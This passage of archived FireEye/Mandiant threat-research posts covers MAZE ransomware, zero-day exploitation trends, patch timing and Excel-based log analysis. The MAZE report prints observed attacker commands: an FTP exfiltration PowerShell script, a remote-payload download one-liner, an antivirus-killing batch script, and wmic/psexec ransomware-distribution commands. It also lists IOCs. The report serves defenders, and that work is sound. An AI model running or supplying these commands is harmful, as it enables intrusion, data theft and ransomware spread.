- Nmap smb-enum-shares, SMB Share Enumeration Detecting the Techniques Platform Signature Name MVX (covers multiple FireEye technologies) Bale Detection FE_Ransomware_Win_MAZE_1 Endpoint Security WMIC SHADOWCOPY DELETE (METHODOLOGY) MAZE RANSOMWARE (FAMILY) Network Security Ransomware.Win.MAZE Ransomware.Maze Ransomware.Maze MITRE ATT&CK Mappings Mandiant currently tracks three separate clusters of activity involved in the post-compromise distribution of MAZE ransomware. Future data collection and analysis efforts may reveal additional groups involved in intrusion activity supporting MAZE operations, or may instead allow us to collapse some of these groups into larger clusters. It should also be noted that ‘initial access’ phase techniques have been included in these mappings, though in some cases this access may have been provided by a separate threat actor(s). MAZE Group 1 MITRE ATT&CK Mapping ATT&CK Tactic Category Techniques Initial Access T1133: External Remote Services T1078: Valid Accounts Execution T1059: Command-Line Interface T1086: PowerShell T1064: Scripting T1035: Service Execution Persistence T1078: Valid Accounts T1050: New Service Privilege Escalation T1078: Valid Accounts Defense Evasion T1078: Valid Accounts T1036: Masquerading T1027: Obfuscated Files or Information T1064: Scripting Credential Access T1110: Brute Force T1003: Credential Dumping Discovery T1087: Account Discovery T1482: Domain Trust Discovery T1083: File and Directory Discovery T1135: Network Share Discovery T1069: Permission Groups Discovery T1018: Remote System Discovery T1016: System Network Configuration Discovery Lateral Movement T1076: Remote Desktop Protocol T1105: Remote File Copy Collection T1005: Data from Local System Command and Control T1043: Commonly Used Port T1105: Remote File Copy T1071: Standard Application Layer Protocol Exfiltration T1002: Data Compressed T1048: Exfiltration Over Alternative Protocol Impact T1486: Data Encrypted for Impact T1489: Service Stop MAZE Group 2 MITRE ATT&CK Mapping ATT&CK Tactic Category Techniques Initial Access T1193: Spearphishing Attachment Execution T1059: Command-Line Interface T1086: PowerShell T1085: Rundll32 T1064: Scripting T1204: User Execution T1028: Windows Remote Management Persistence T1078: Valid Accounts T1050: New Service T1136: Create Account Privilege Escalation T1078: Valid Accounts T1050: New Service Defense Evasion T1078: Valid Accounts T1140: Deobfuscate/Decode Files or Information T1107: File Deletion T1036: Masquerading Credential Access T1003: Credential Dumping T1081: Credentials in Files T1171: LLMNR/NBT-NS Poisoning Discovery T1087: Account Discovery T1482: Domain Trust Discovery T1083: File and Directory Discovery T1135: Network Share Discovery T1069: Permission Groups Discovery T1018: Remote System Discovery T1033: System Owner/User Discovery Lateral Movement T1076: Remote Desktop Protocol T1028: Windows Remote Management Collection T1074: Data Staged T1005: Data from Local System T1039: Data from Network Shared Drive Command and Control T1043: Commonly Used Port T1219: Remote Access Tools T1105: Remote File Copy T1071: Standard Application Layer Protocol T1032: Standard Cryptographic Protocol Exfiltration T1020: Automated Exfiltration T1002: Data Compressed T1048: Exfiltration Over Alternative Protocol Impact T1486: Data Encrypted for Impact MAZE Group 3 MITRE ATT&CK Mapping (FIN6) ATT&CK Tactic Category Techniques Initial Access T1133: External Remote Services T1078: Valid Accounts Execution T1059: Command-Line Interface T1086: PowerShell T1064: Scripting T1035: Service Execution Persistence T1078: Valid Accounts T1031: Modify Existing Service Privilege Escalation T1055: Process Injection T1078: Valid Accounts Defense Evasion T1055: Process Injection T1078: Valid Accounts T1116: Code Signing T1089: Disabling Security Tools T1202: Indirect Command Execution T1112: Modify Registry T1027: Obfuscated Files or Information T1108: Redundant Access T1064: Scripting Credential Access T1003: Credential Dumping Discovery T1087: Account Discovery T1482: Domain Trust Discovery T1083: File and Directory Discovery T1069: Permission Groups Discovery T1018: Remote System Discovery Lateral Movement T1097: Pass the Ticket T1076: Remote Desktop Protocol T1105: Remote File Copy T1077: Windows Admin Shares Collection T1074: Data Staged T1039: Data from Network Shared Drive Command and Control T1043: Commonly Used Port T1219: Remote Access Tools T1105: Remote File Copy T1071: Standard Application Layer Protocol T1032: Standard Cryptographic Protocol Exfiltration T1002: Data Compressed Impact T1486: Data Encrypted for Impact T1490: Inhibit System Recovery T1489: Service Stop Example Commands Observed in MAZE Ransomware Incidents function Enum-UsersFolders($PathEnum) { $foldersArr = 'Desktop','Downloads','Documents','AppData/Roaming','AppData/Local' Get-ChildItem -Path $PathEnum'/c$' -ErrorAction SilentlyContinue Get-ChildItem -Path $PathEnum'/c$/Program Files' -ErrorAction SilentlyContinue Get-ChildItem -Path $PathEnum'/c$/Program Files (x86)' -ErrorAction SilentlyContinue foreach($Directory in Get-ChildItem -Path $PathEnum'/c$/Users' -ErrorAction SilentlyContinue) { foreach($SeachDir in $foldersArr) { Get-ChildItem -Path $PathEnum'/c$/Users/'$Directory'/'$SeachDir -ErrorAction SilentlyContinue } } } PowerShell reconnaissance script used to enumerate directories $Dir=\"C:/Windows/Temp/\" #ftp server $ftp = \"ftp://<IP Address>/incoming/\" $user = \"<username>\" $pass = \"<password>\" $webclient = New-Object System.Net.WebClient $webclient.Credentials = New-Object System.Net.NetworkCredential($user,$pass) #list every sql server trace file foreach($item in (dir $Dir \"*.7z\")){ \"Uploading $item...\" $uri = New-Object System.Uri($ftp+$item.Name) $webclient.UploadFile($uri, $item.FullName) } Decoded FTP upload PowerShell script powershell -nop -exec bypass IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:43984/'); Add-FtpFile -ftpFilePath \"ftp://<IP  Address>/cobalt_uploads/<file name>\" -localFile \"<local file path>\\ <file name> \" -userName \"<username>\" -password \"<password>\" Decoded FTP upload PowerShell script […] echo 7 echo 7 taskkill /im csrss_tc.exe /f taskkill /im kwsprod.exe /f taskkill /im avkwctl.exe /f taskkill /im rnav.exe /f taskkill /im crssvc.exe /f sc config CSAuth start= disabled taskkill /im vsserv.exe /f taskkill /im ppmcativedetection.exe /f […] taskkill /im sahookmain.exe /f taskkill /im mcinfo.exe /f reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Ye c:\\windows\\temp\\sss.exe Excerpt from windows.bat kill script start copy sss.exe \\\\<internal IP>\\c$\\windows\\temp\\ start copy sss.exe \\\\<internal IP>\\c$\\windows\\temp\\ start copy windows.bat \\\\<internal IP>\\c$\\windows\\temp\\ start copy windows.bat \\\\<internal IP>\\c$\\windows\\temp\\ start wmic /node:\"<internal IP>\" /user:\"< DOMAIN\\adminaccount >\" /password:\"< password >\" process call create \"c:\\windows\\temp\\sss.exe\" start wmic /node:\"<internal IP>\" /user:\"< DOMAIN\\adminaccount> \" /password:\"< password >\" process call create \"c:\\windows\\temp\\sss.exe\" start wmic /node:\"<internal IP>\" /user:\"<DOMAIN\\adminaccount>\" /password:\"< password >\" process call create \"cmd.exe /c c:\\windows\\temp\\windows.bat\" start wmic /node:\"<internal IP>\" /user:\"< DOMAIN\\adminaccount >\" /password:\"< password >\" process call create \"cmd.exe /c c:\\windows\\temp\\windows.bat\" start wmic /node:\"<internal IP>\" /user:\"< DOMAIN\\adminaccount >\" /password:\"< password >\" process call create \"cmd.exe /c copy \\\\<internal IP>\\c$\\windows\\temp\\sss.exe c:\\windows\\temp\\\" start wmic /node:\"<internal IP>\" /user:\"< DOMAIN\\adminaccount >\" /password:\"< password >\" process call create \"cmd.exe /c copy \\\\<internal IP>\\c$\\windows\\temp\\sss.exe c:\\windows\\temp\\\" start wmic /node:\"<internal IP>\" /user:\"< DOMAIN\\adminaccount >\" /password:\"< password >\" process call create \"cmd.exe /c copy \\\\<internal IP>\\c$\\windows\\temp\\windows.bat c:\\windows\\temp\\\" start wmic /node:\"<internal IP>\" /user:\"< DOMAIN\\adminaccount >\" /password:\"< password >\" process call create \"cmd.exe /c copy \\\\<internal IP>\\c$\\windows\\temp\\windows.bat c:\\windows\\temp\\\" start psexec.exe \\\\<internal IP> -u < DOMAIN\\adminaccount > -p \"< password >\" -d -h -r rtrsd -s -accepteula -nobanner c:\\windows\\temp\\sss.exe start psexec.exe \\\\<internal IP> -u < DOMAIN\\adminaccount > -p \"< password >\" -d -h -r rtrsd -s -accepteula -nobanner c:\\windows\\temp\\sss.exe start psexec.exe \\\\<internal IP> -u < DOMAIN\\adminaccount > -p \"< password >\" -d -h -r rtrsd -s -accepteula -nobanner c:\\windows\\temp\\windows.bat start psexec.exe \\\\<internal IP> -u < DOMAIN\\adminaccount> -p \"< password >\" -d -h -r rtrsd -s -accepteula -nobanner c:\\windows\\temp\\windows.bat Example commands from MAZE distribution scripts @echo off del done.txt del offline.txt rem Loop thru list of computer names in file specified on command-line for /f %%i in (%1) do call :check_machine %%i goto end :check_machine rem Check to see if machine is up. ping -n 1 %1|Find \"TTL=\" >NUL 2>NUL if errorlevel 1 goto down echo %1 START cmd /c \"copy [Location of MAZE binary] \\\\%1\\c$\\windows\\temp && exit\" timeout 1 > NUL echo %1 >> done.txt rem wmic /node:\"%1\" process call create \"regsvr32.exe /i C:\\windows\\temp\\[MAZE binary name]\" >> done.txt START \"\" cmd /c \"wmic /node:\"%1\" process call create \"regsvr32.exe /i C:\\windows\\temp\\[MAZE binary name]\" && exit\" goto end :down rem Report machine down echo %1 >> offline.txt :end Example MAZE distribution script Indicators of Compromise Maze Payloads 064058cf092063a5b69ed8fd2a1a04fe 0f841c6332c89eaa7cac14c9d5b1d35b 108a298b4ed5b4e77541061f32e55751 11308e450b1f17954f531122a56fae3b 15d7dd126391b0e7963c562a6cf3992c 21a563f958b73d453ad91e251b11855c 27c5ecbb94b84c315d56673a851b6cf9 2f78ff32cbb3c478865a88276248d419 335aba8d135cc2e66549080ec9e8c8b7 3bfcba2dd05e1c75f86c008f4d245f62 46b98ee908d08f15137e509e5e69db1b 5774f35d180c0702741a46d98190ff37 5df79164b6d0661277f11691121b1d53 658e9deec68cf5d33ee0779f54806cc2 65cf08ffaf12e47de8cd37098aac5b33 79d137d91be9819930eeb3876e4fbe79 8045b3d2d4a6084f14618b028710ce85 8205a1106ae91d0b0705992d61e84ab2 83b8d994b989f6cbeea3e1a5d68ca5d8 868d604146e7e5cb5995934b085846e3 87239ce48fc8196a5ab66d8562f48f26 89e1ddb8cc86c710ee068d6c6bf300f4 910aa49813ee4cc7e4fa0074db5e454a 9eb13d56c363df67490bcc2149229e4c a0c5b4adbcd9eb6de9d32537b16c423b a3a3495ae2fc83479baeaf1878e1ea84 b02be7a336dcc6635172e0d6ec24c554 b40a9eda37493425782bda4a3d9dad58 b4d6cb4e52bb525ebe43349076a240df b6786f141148925010122819047d1882 b93616a1ea4f4a131cc0507e6c789f94 bd9838d84fd77205011e8b0c2bd711e0 be537a66d01c67076c8491b05866c894 bf2e43ff8542e73c1b27291e0df06afd c3ce5e8075f506e396ee601f2757a2bd d2dda72ff2fbbb89bd871c5fc21ee96a d3eaab616883fcf51dcbdb4769dd86df d552be44a11d831e874e05cadafe04b6 deebbea18401e8b5e83c410c6d3a8b4e dfa4631ec2b8459b1041168b1b1d5105 e57ba11045a4b7bc30bd2d33498ef194 e69a8eb94f65480980deaf1ff5a431a6 ef95c48e750c1a3b1af8f5446fa04f54 f04d404d84be66e64a584d425844b926 f457bb5060543db3146291d8c9ad1001 f5ecda7dd8bb1c514f93c09cea8ae00d f83cef2bf33a4d43e58b771e81af3ecc fba4cbb7167176990d5a8d24e9505f71 Maze Check-in IPs 91.218.114.11 91.218.114.25 91.218.114.26 91.218.114.31 91.218.114.32 91.218.114.37 91.218.114.38 91.218.114.4 91.218.114.77 91.218.114.79 92.63.11.151 92.63.15.6 92.63.15.8 92.63.17.245 92.63.194.20 92.63.194.3 92.63.29.137 92.63.32.2 92.63.32.52 92.63.32.55 92.63.32.57 92.63.37.100 92.63.8.47 Maze-related Domains aoacugmutagkwctu[.]onion mazedecrypt[.]top mazenews[.]top newsmaze[.]top Maze Download URLs http://104.168.174.32/wordupd_3.0.1.tmp http://104.168.198.208/wordupd.tmp http://104.168.201.35/dospizdos.tmp http://104.168.201.47/wordupd.tmp http://104.168.215.54/wordupd.tmp http://149.56.245.196/wordupd.tmp http://192.119.106.235/mswordupd.tmp http://192.119.106.235/officeupd.tmp http://192.99.172.143/winupd.tmp http://54.39.233.188/win163.65.tmp http://91.208.184.174:8079/windef.exe http://agenziainformazioni[.]icu/wordupd.tmp http://www.download-invoice[.]site/Invoice_29557473.exe Malicious Documents 1a26c9b6ba40e4e3c3dce12de266ae10 53d5bdc6bd7904b44078cf80e239d42b 79271dc08052480a578d583a298951c5 a2d631fcb08a6c840c23a8f46f6892dd ad30987a53b1b0264d806805ce1a2561 c09af442e8c808c953f4fa461956a30f ee26e33725b14850b1776a67bd8f2d0a BEACON C2s 173.209.43.61 193.36.237.173 37.1.213.9 37.252.7.142 5.199.167.188 checksoffice[.]me drivers.updatecenter[.]icu plaintsotherest[.]net thesawmeinrew[.]net updates.updatecenter[.]icu Cobalt Strike Binaries 7507fe19afbda652e9b2768c10ad639f a93b86b2530cc988f801462ead702d84 4f57e35a89e257952c3809211bef78ea bad6fc87a98d1663be0df23aedaf1c62 f5ef96251f183f7fc63205d8ebf30cbf c818cc38f46c604f8576118f12fd0a63 078cf6db38725c37030c79ef73519c0c c255daaa8abfadc12c9ae8ae2d148b31 1fef99f05bf5ae78a28d521612506057 cebe4799b6aff9cead533536b09fecd1 4ccca6ff9b667a01df55326fcc850219 bad6fc87a98d1663be0df23aedaf1c62 Meterpreter C2s 5.199.167.188 Other Related Files 3A5A9D40D4592C344920DD082029B362 (related script) 76f8f28bd51efa03ab992fdb050c8382 (MAZE execution artifact) b5aa49c1bf4179452a85862ade3ef317 (windows.bat kill script) fad3c6914d798e29a3fd8e415f1608f4 (related script) Tools & Utilities 27304b246c7d5b4e149124d5f93c5b01 (PsExec) 42badc1d2f03a8b1e4875740d3d49336 (7zip) 75b55bb34dac9d02740b9ad6b6820360 (PsExec) 9b02dd2a1a15e94922be3f85129083ac (AdFind) c621a9f931e4ebf37dace74efcce11f2 (SMBTools) f413b4a2242bb60829c9a470eea4dfb6 (winRAR) Email Sender Domains att-customer[.]com att-information[.]com att-newsroom[.]com att-plans[.]com bezahlen-1und1[.]icu bzst-info[.]icu bzst-inform[.]icu bzstinfo[.]icu bzstinform[.]icu canada-post[.]icu canadapost-delivery[.]icu canadapost-tracking[.]icu hilfe-center-1und1[.]icu hilfe-center-internetag[.]icu trackweb-canadapost[.]icu Sender Domain Registrant Addresses abusereceive@hitler.rocks gladkoff1991@yandex.ru Mandiant Threat Intelligence will host an exclusive webinar on Thursday, May 21, 2020, at 8 a.m. PT / 11 a.m. ET to provide updated insight and information into the MAZE ransomware threat, and to answer questions from attendees. Register today to reserve your spot. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2020/04/zero-day-exploitation-demonstrates-access-to-money-not-skill.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2020-04-06",
                    "source": "www.fireeye.com"
                },
                "text": "One of the critical strategic and tactical roles that cyber threat intelligence (CTI) plays is in the tracking, analysis, and prioritization of software vulnerabilities that could potentially put an organization’s data, employees and customers at risk. In this four-part blog series, FireEye Mandiant Threat Intelligence highlights the value of CTI in enabling vulnerability management, and unveils new research into the latest threats, trends and recommendations. FireEye Mandiant Threat Intelligence documented more zero-days exploited in 2019 than any of the previous three years. While not every instance of zero-day exploitation can be attributed to a tracked group, we noted that a wider range of tracked actors appear to have gained access to these capabilities. Furthermore, we noted a significant increase over time in the number of zero-days leveraged by groups suspected to be customers of companies that supply offensive cyber capabilities, as well as an increase in zero-days used against targets in the Middle East, and/or by groups with suspected ties to this region. Going forward, we are likely to see a greater variety of actors using zero-days, especially as private vendors continue feeding the demand for offensive cyber weapons. Zero-Day Usage by Country and Group Since late 2017, FireEye Mandiant Threat Intelligence noted a significant increase in the number of zero-days leveraged by groups that are known or suspected to be customers of private companies that supply offensive cyber tools and services. Additionally, we observed an increase in zero-days leveraged against targets in the Middle East, and/or by groups with suspected ties to this region. Examples include: A group described by researchers as Stealth Falcon and FruityArmor is an espionage group that has reportedly targeted journalists and activists in the Middle East . In 2016, this group used malware sold by NSO group, which leveraged three iOS zero-days. From 2016 to 2019, this group used more zero-days than any other group. The activity dubbed SandCat in open sources, suspected to be linked to Uzbekistan state intelligence , has been observed using zero-days in operations against targets in the Middle East. This group may have acquired their zero-days by purchasing malware from private companies such as NSO group, as the zero-days used in SandCat operations were also used in Stealth Falcon operations, and it is unlikely that these distinct activity sets independently discovered the same three zero-days. Throughout 2016 and 2017, activity referred to in open sources as BlackOasis , which also primarily targets entities in the Middle East and likely acquired at least one zero-day in the past from private company Gamma Group , demonstrated similarly frequent access to zero-day vulnerabilities. We also noted examples of zero-day exploitation that have not been attributed to tracked groups but that appear to have been leveraged in tools provided by private offensive security companies, for instance: In 2019, a zero-day exploit in WhatsApp (CVE-2019-3568) was reportedly used to distribute spyware developed by NSO group, an Israeli software company. FireEye analyzed activity targeting a Russian healthcare organization that leveraged a 2018 Adobe Flash zero-day (CVE-2018-15982) that may be linked to leaked source code of Hacking Team. Android zero-day vulnerability CVE-2019-2215 was reportedly being exploited in the wild in October 2019 by NSO Group tools. Zero-Day Exploitation by Major Cyber Powers We have continued to see exploitation of zero days by espionage groups of major cyber powers. According to researchers, the Chinese espionage group APT3 exploited CVE-2019-0703 in targeted attacks in 2016 . FireEye observed North Korean group APT37 conduct a 2017 campaign that leveraged Adobe Flash vulnerability CVE-2018-4878. This group has also demonstrated an increased capacity to quickly exploit vulnerabilities shortly after they have been disclosed. From December 2017 to January 2018, we observed multiple Chinese groups leveraging CVE-2018-0802 in a campaign targeting multiple industries throughout Europe, Russia, Southeast Asia, and Taiwan. At least three out of six samples were used before the patch for this vulnerability was issued. In 2017, Russian groups APT28 and Turla leveraged multiple zero-days in Microsoft Office products. In addition, we believe that some of the most dangerous state sponsored intrusion sets are increasingly demonstrating the ability to quickly exploit vulnerabilities that have been made public. In multiple cases, groups linked to these countries have been able to weaponize vulnerabilities and incorporate them into their operations, aiming to take advantage of the window between disclosure and patch application. Zero-Day Use by Financially Motivated Actors Financially motivated groups have and continue to leverage zero-days in their operations , though with less frequency than espionage groups. In May 2019, we reported that FIN6 used a Windows server 2019 use-after-free zero-day (CVE-2019-0859) in a targeted intrusion in February 2019. Some evidence suggests that the group may have used the exploit since August 2018. While open sources have suggested that the group potentially acquired the zero-day from criminal underground actor \" BuggiCorp ,\" we have not identified direct evidence linking this actor to this exploit's development or sale. Conclusion We surmise that access to zero-day capabilities is becoming increasingly commodified based on the proportion of zero-days exploited in the wild by suspected customers of private companies. Possible reasons for this include: Private companies are likely creating and supplying a larger proportion of zero-days than they have in the past, resulting in a concentration of zero-day capabilities among highly resourced groups. Private companies may be increasingly providing offensive capabilities to groups with lower overall capability and/or groups with less concern for operational security, which makes it more likely that usage of zero-days will be observed. It is likely that state groups will continue to support internal exploit discovery and development; however, the availability of zero-days through private companies may offer a more attractive option than relying on domestic solutions or underground markets. As a result, we expect that the number of adversaries demonstrating access to these kinds of vulnerabilities will almost certainly increase and will do so at a faster rate than the growth of their overall offensive cyber capabilities—provided they have the ability and will to spend the necessary funds. Register today to hear FireEye Mandiant Threat Intelligence experts discuss the latest in vulnerability threats, trends and recommendations in our upcoming April 30 webinar. Sourcing Note: Some vulnerabilities and zero-days were identified based on FireEye research, Mandiant breach investigation findings, and other technical collections. This paper also references vulnerabilities and zero-days discussed in open sources including Google Project Zero's zero-day \"In the Wild\" Spreadsheet . While we believe these sources are reliable as used in this paper, we do not vouch for the complete findings of those sources. Due to the ongoing discovery of past incidents, we expect that this research will remain dynamic. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2020/04/time-between-disclosure-patch-release-and-vulnerability-exploitation.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2020-04-13",
                    "source": "www.fireeye.com"
                },
                "text": "One of the critical strategic and tactical roles that cyber threat intelligence (CTI) plays is in the tracking, analysis, and prioritization of software vulnerabilities that could potentially put an organization’s data, employees and customers at risk. In this four-part blog series, FireEye Mandiant Threat Intelligence highlights the value of CTI in enabling vulnerability management, and unveils new research into the latest threats, trends and recommendations. Check out our first post on zero-day vulnerabilities . Attackers are in a constant race to exploit newly discovered vulnerabilities before defenders have a chance to respond. FireEye Mandiant Threat Intelligence research into vulnerabilities exploited in 2018 and 2019 suggests that the majority of exploitation in the wild occurs before patch issuance or within a few days of a patch becoming available. Figure 1: Percentage of vulnerabilities exploited at various times in relation to patch release FireEye Mandiant Threat Intelligence analyzed 60 vulnerabilities that were either exploited or assigned a CVE number between Q1 2018 to Q3 2019. The majority of vulnerabilities were exploited as zero-days – before a patch was available. More than a quarter were exploited within one month after the patch date. Figure 2 illustrates the number of days between when a patch was made available and the first observed exploitation date for each vulnerability. We believe these numbers to be conservative estimates, as we relied on the first reported exploitation of a vulnerability linked to a specific date. Frequently, first exploitation dates are not publicly disclosed. It is also likely that in some cases exploitation occurred without being discovered before researchers recorded exploitation attached to a certain date. Figure 2: Time between vulnerability exploitation and patch issuance ­­­ Time Between Disclosure and Patch Release The average time between disclosure and patch availability was approximately 9 days. This average is slightly inflated by vulnerabilities such as CVE-2019-0863, a Microsoft Windows server vulnerability, which was disclosed in December 2018 and not patched until 5 months later in May 2019. The majority of these vulnerabilities, however, were patched quickly after disclosure. In 59% of cases, a patch was released on the same day the vulnerability was disclosed. These metrics, in combination with the observed swiftness of adversary exploitation activity, highlight the importance of responsible disclosure, as it may provide defenders with the slim window needed to successfully patch vulnerable systems. Exploitation After Patch Release While the majority of the observed vulnerabilities were zero-days, 42 percent of vulnerabilities were exploited after a patch had been released. For these non-zero-day vulnerabilities, there was a very small window (often only hours or a few days) between when the patch was released and the first observed instance of attacker exploitation. Table 1 provides some insight into the race between attackers attempting to exploit vulnerable software and organizations attempting to deploy the patch. Time to Exploit for Vulnerabilities First Exploited after a Patch Hours Two vulnerabilities were successfully exploited within hours of a patch release, CVE-2018-2628 and CVE-2018-7602. Days 12 percent of vulnerabilities were exploited within the first week following the patch release. One Month 15 percent of vulnerabilities were exploited after one week but within one month of patch release. Years In multiple cases, such as the first observed exploitation of CVE-2010-1871 and CVE-2012-0874 in 2019, attackers exploited vulnerabilities for which a patch had been made available many years prior. Table 1: Exploitation timing for patched vulnerabilities ranges from within hours of patch issuance to years after initial disclosure Case Studies We continue to observe espionage and financially motivated groups quickly leveraging publicly disclosed vulnerabilities in their operations. The following examples demonstrate the speed with which sophisticated groups are able to incorporate vulnerabilities into their toolsets following public disclosure and the fact that multiple disparate groups have repeatedly leveraged the same vulnerabilities in independent campaigns. Successful operations by these types of groups are likely to have a high potential impact. Figure 3: Timeline of activity for CVE-2018-15982 CVE-2018-15982: A use after free vulnerability in a file package in Adobe Flash Player 31.0.0.153 and earlier that, when exploited, allows an attacker to remotely execute arbitrary code. This vulnerability was exploited by espionage groups—Russia's APT28 and North Korea's APT37—as well as TEMP.MetaStrike and other financially motivated attackers. Figure 4: Timeline of activity for CVE-2018-20250 CVE-2018-20250: A path traversal vulnerability exists within the ACE format in the archiver tool WinRAR versions 5.61 and earlier that, when exploited, allows an attacker to locally execute arbitrary code. This vulnerability was exploited by multiple espionage groups, including Chinese, North Korean, and Russian, groups, as well as Iranian groups APT33 and TEMP.Zagros. Figure 5: Timeline of Activity for CVE-2018-4878 CVE-2018-4878: A use after free vulnerability exists within the DRMManager’s “initialize” call in Adobe Flash Player 28.0.0.137 and earlier that, when exploited, allows an attacker to remotely execute arbitrary code. Mandiant Intelligence confirmed that North Korea’s APT37 exploited this vulnerability as a zero-day as early as September 3, 2017. Within 8 days of disclosure, we observed Russia’s APT28 also leverage this vulnerability, with financially motivated attackers and North Korea’s TEMP.Hermit also using within approximately a month of disclosure. Availability of PoC or Exploit Code The availability of POC or exploit code on its own does not always increase the probability or speed of exploitation. However, we believe that POC code likely hastens exploitation attempts for vulnerabilities that do not require user interaction. For vulnerabilities that have already been exploited, the subsequent introduction of publicly available exploit or POC code indicates malicious actor interest and makes exploitation accessible to a wider range of attackers. There were a number of cases in which certain vulnerabilities were exploited on a large scale within 48 hours of PoC or exploit code availability (Table 2). Time Between PoC or Exploit Code Publication and First Observed Potential Exploitation Events Product CVE FireEye Risk Rating 1 day WinRAR CVE-2018-20250 Medium 1 day Drupal CVE-2018-7600 High 1 day Cisco Adaptive Security Appliance CVE-2018-0296 Medium 2 days Apache Struts CVE-2018-11776 High 2 days Cisco Adaptive Security Appliance CVE-2018-0101 High 2 days Oracle WebLogic Server CVE-2018-2893 High 2 days Microsoft Windows Server CVE-2018-8440 Medium 2 days Drupal CVE-2019-6340 Medium 2 days Atlassian Confluence CVE-2019-3396 High Table 2: Vulnerabilities exploited within two days of either PoC or exploit code being made publicly available, Q1 2018–Q3 2019 Trends by Targeted Products FireEye judges that malicious actors are likely to most frequently leverage vulnerabilities based on a variety of factors that influence the utility of different vulnerabilities to their specific operations. For instance, we believe that attackers are most likely to target the most widely used products (see Figure 6). Attackers almost certainly also consider the cost and availability of an exploit for a specific vulnerability, the perceived success rate based on the delivery method, security measures introduced by vendors, and user awareness around certain products. The majority of observed vulnerabilities were for Microsoft products, likely due to the ubiquity of Microsoft offerings. In particular, vulnerabilities in software such as Microsoft Office Suite may be appealing to malicious actors based on the utility of email attached documents as initial infection vectors in phishing campaigns. Figure 6: Exploited vulnerabilities by vendor, Q1 2018–Q3 2019 Outlook and Implications The speed with which attackers exploit patched vulnerabilities emphasizes the importance of patching as quickly as possible. With the sheer quantity of vulnerabilities disclosed each year, however, it can be difficult for organizations with limited resources and business constraints to implement an effective strategy for prioritizing the most dangerous vulnerabilities. In upcoming blog posts, FireEye Mandiant Threat Intelligence describes our approach to vulnerability risk rating as well as strategies for making informed and realistic patch management decisions in more detail. We recommend using this exploitation trend information to better prioritize patching schedules in combination with other factors, such as known active threats to an organization's industry and geopolitical context, the availability of exploit and PoC code, commonly impacted vendors, and how widely software is deployed in an organization's environment may help to mitigate the risk of a large portion of malicious activity. Register today to hear FireEye Mandiant Threat Intelligence experts discuss the latest in vulnerability threats, trends and recommendations in our upcoming April 30 webinar. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2020/04/excelerating-analysis-lookup-pivot.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2020-04-28",
                    "source": "www.fireeye.com"
                },
                "text": "In December 2019, we published a blog post on augmenting analysis using Microsoft Excel for various data sets for incident response investigations. As we described, investigations often include custom or proprietary log formats and miscellaneous, non-traditional forensic artifacts. There are, of course, a variety of ways to tackle this task, but Excel stands out as a reliable way to analyze and transform a majority of data sets we encounter. In our first post, we discussed summarizing verbose artifacts using the CONCAT function, converting timestamps using the TIME function, and using the COUNTIF function for log baselining. In this post, we will cover two additional versatile features of Excel: LOOKUP functions and PivotTables. For this scenario, we will use a dataset of logon events for an example Microsoft Office 365 (O365) instance to demonstrate how an analyst can enrich information in the dataset. Then we will demonstrate some examples of how to use PivotTables to summarize information and highlight anomalies in the data quickly. Our data contains the following columns: Description – Event description User – User’s name User Principle Name – email address App – such as Office 365, Sharepoint, etc. Location – Country Date IP address User agent (simplified) Organization – associated with IP address (as identified by O365) Figure 1: O365 data set LOOKUP for Data Enrichment It may be useful to add more information to the data that could help us in analysis that isn’t provided by the original log source. A step FireEye Mandiant often performs during investigations is to take all unique IP addresses and query threat intelligence sources for each IP address for reputation, WHOIS information, connections to known threat actor activity, etc. This grants more information about each IP address that we can take into consideration in our analysis. While FireEye Mandiant is privy to historical engagement data and Mandiant Threat Intelligence , if security teams or organizations do not have access to commercial threat intelligence feeds, there are numerous open source intelligence services that can be leveraged. We can also use IP address geolocation services to obtain latitude and longitude related to each source IP address. This information may be useful in identifying anomalous logons based on geographical location. After taking all source IP addresses, running them against threat intelligence feeds and geolocating them, we have the following data added to a second sheet called “IP Address Intel” in our Excel document: Figure 2: IP address enrichment We can already see before we even dive into the logs themselves that we have suspicious activity: The five IP addresses in the 203.0.113.0/24 range in our data are known to be associated with activity connected to a fictional threat actor tracked as TMP.OGRE. To enrich our original dataset, we will add three columns to our data to integrate the supplementary information: “Latitude,” “Longitude,” and “Threat Intel” (Figure 3). We can use the VLOOKUP or XLOOKUP functions to quickly retrieve the supplementary data and integrate it into our main O365 log sheet. Figure 3: Enrichment columns VLOOKUP The traditional way to look up particular data in another array is by using the VLOOKUP function . We will use the following formula to reference the “Latitude” values for a given IP address: Figure 4: VLOOKUP formula for Latitude There are four parts to this formula: Value to look up: This dictates what cell value we are going to look up more information for. In this case, it is cell G2, which is the IP address. Table array: This defines the entire array in which we will look up our value and return data from. The first column in the array must contain the value being looked up. In the aforementioned example, we are searching in ‘IP Address Intel’!$A$2:$D:$15. In other words, we are looking in the other sheet in this workbook we created earlier titled “IP Address Intel”, then in that sheet, search in the cell range of A2 to D15. Figure 5: VLOOKUP table array Note the use of the “$” to ensure these are absolute references and will not be updated by Excel if we copy this formula to other cells. Column index number: This identifies the column number from which to return data. The first column is considered column 1. We want to return the “Latitude” value for the given IP address, so in the aforementioned example, we tell Excel to return data from column 2. Range lookup (match type) This part of the formula tells Excel what type of matching to perform on the value being looked up. Excel defaults to “Approximate” matching, which assumes the data is sorted and will match the closest value. We want to perform “Exact” matching, so we put “0” here (“FALSE” is also accepted). With the VLOOKUP function complete for the “Latitude” data, we can use the fill handle to update this field for the rest of the data set. To get the values for the “Longitude” and “Threat Intel” columns, we repeat the process by using a similar function and, adjusting the column index number to reference the appropriate columns, then use the fill handle to fill in the rest of the column in our O365 data sheet: For Longitude: =VLOOKUP(G2,'IP Address Intel'!$A$2:$D$15, 3 ,0) For Threat Intel: =VLOOKUP(G2,'IP Address Intel'!$A$2:$D$15, 4 ,0) Bonus Option: XLOOKUP The XLOOKUP function in Excel is a 